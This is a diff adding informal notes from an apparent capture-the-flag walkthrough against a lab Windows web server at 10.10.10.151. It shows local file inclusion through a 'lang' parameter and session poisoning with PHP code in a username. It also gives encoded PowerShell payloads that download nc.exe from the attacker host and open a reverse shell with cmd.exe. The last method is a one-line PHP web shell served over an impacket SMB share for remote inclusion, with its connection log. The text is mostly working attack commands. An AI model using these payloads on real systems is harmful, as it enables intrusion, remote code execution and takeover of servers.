@@ -1,0 +1,76 @@
+
+
+
+create user
+
+in the language selection there is LFI
+
+10.10.10.151/blog/?lang=/windows/temp/sess_dm2da5750d43n4p2rdu2euhbvh
+
+we create a username containing php code to gain RCE
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# python3 php_blacklist_check.py 
+Blacklisted Characters:
+"
+$
+&
+(
+-
+.
+;
+[
+_
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# echo "wget http://10.10.14.16/nc.exe -o C:\\Windows\\TEMP\\nc.exe" | iconv -t UTF-16LE | base64
+dwBnAGUAdAAgAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0AC4AMQA2AC8AbgBjAC4AZQB4
+AGUAIAAtAG8AIABDADoAXABXAGkAbgBkAG8AdwBzAFwAVABFAE0AUAAKAGMALgBlAHgAZQAKAA==
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# echo "C:\\Windows\\TEMP\\nc.exe -e cmd.exe 10.10.14.16 1234" | iconv -t UTF-16LE | base64
+QwA6AFwAVwBpAG4AZABvAHcAcwBcAFQARQBNAFAACgBjAC4AZQB4AGUAIAAtAGUAIABjAG0AZAAu
+AGUAeABlACAAMQAwAC4AMQAwAC4AMQA0AC4AMQA2ACAAMQAyADMANAAKAA==
+                                                                                                                     
+one user is 
+<?=`powershell /enc dwBnAGUAdAAgAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0AC4AMQA2AC8AbgBjAC4AZQB4AGUAIAAtAG8AIABDADoAXABXAGkAbgBkAG8AdwBzAFwAVABFAE0AUAAKAGMALgBlAHgAZQAKAA==`?>
+
+the other
+<?=`powershell /enc QwA6AFwAVwBpAG4AZABvAHcAcwBcAFQARQBNAFAACgBjAC4AZQB4AGUAIAAtAGUAIABjAG0AZAAuAGUAeABlACAAMQAwAC4AMQAwAC4AMQA0AC4AMQA2ACAAMQAyADMANAAKAA==`?>
+
+
+that didnt work. so im doing something else.
+
+mkdir -p ~/smbshare/Public
+printf '<?=$_GET[0]?>' > ~/smbshare/Public/shell.php
+impacket-smbserver Public ~/smbshare -smb2support
+
+
+http://10.10.10.151/blog/?lang=//10.10.14.16/Public/shell.php&0=dir
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# mkdir -p ~/smbshare/Public
+printf '<?=$_GET[0]?>' > ~/smbshare/Public/shell.php
+impacket-smbserver Public ~/smbshare -smb2support
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+[*] Incoming connection (10.10.10.151,49791)
+[*] AUTHENTICATE_MESSAGE (\,SNIPER)
+[*] User SNIPER\ authenticated successfully
+[*] :::00::aaaaaaaaaaaaaaaa
+[*] Connecting Share(1:IPC$)
+[*] Connecting Share(2:PUBLIC)
+[*] Disconnecting Share(1:IPC$)
+[*] Disconnecting Share(2:PUBLIC)
+[*] Closing down connection (10.10.10.151,49791)
+[*] Remaining connections []
+
+
